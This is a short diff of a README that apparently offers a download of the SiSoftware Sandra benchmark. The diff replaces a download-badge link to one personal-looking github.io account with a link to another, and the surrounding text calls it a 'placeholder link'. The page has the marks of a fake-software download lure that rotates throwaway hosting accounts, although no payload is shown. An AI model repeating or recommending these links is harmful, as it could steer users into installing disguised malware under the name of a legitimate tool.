@@ -24,7 +24,7 @@ Open Modules manager, disable GPU crypto tests on live trading floor PCs, enable
 | :--- | :--- |
 | **Get SiSoftware Sandra modular benchmark groups** | Placeholder link for Sandra **SiSoftware Sandra modular benchmark groups** documentation. |
 
-[![Download](https://img.shields.io/badge/Download-Sandra-blue?style=for-the-badge)](https://louisejunerainbow1998.github.io/.github/sisoftware-sandra-modular-benchmark-groups)
+[![Download](https://img.shields.io/badge/Download-Sandra-blue?style=for-the-badge)](https://fordchangjcqy.github.io/.github/sisoftware-sandra-modular-benchmark-groups)
 
 ## System Requirements
 
